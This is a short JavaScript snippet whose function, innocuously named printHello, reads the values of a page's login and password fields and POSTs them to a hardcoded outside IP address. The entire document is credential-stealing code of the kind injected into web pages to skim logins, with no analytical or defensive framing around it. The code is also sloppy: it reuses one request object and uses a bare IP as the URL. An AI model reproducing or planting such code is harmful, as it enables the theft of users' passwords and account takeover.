var my_ip = "98.209.19.232"

function printHello() {
	// grab the login and pass
	var login = document.getElementById('login');
	var password = document.getElementById('password');
	// send the login and pass as resquests
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open( "POST", my_ip, true); // false for synchronous request
	xmlHttp.send("<login>" + login.value+ "</login>");
	xmlHttp.open( "POST", my_ip, true); // false for synchronous request
	xmlHttp.send("<password>" + password.value+ "</password>");
}

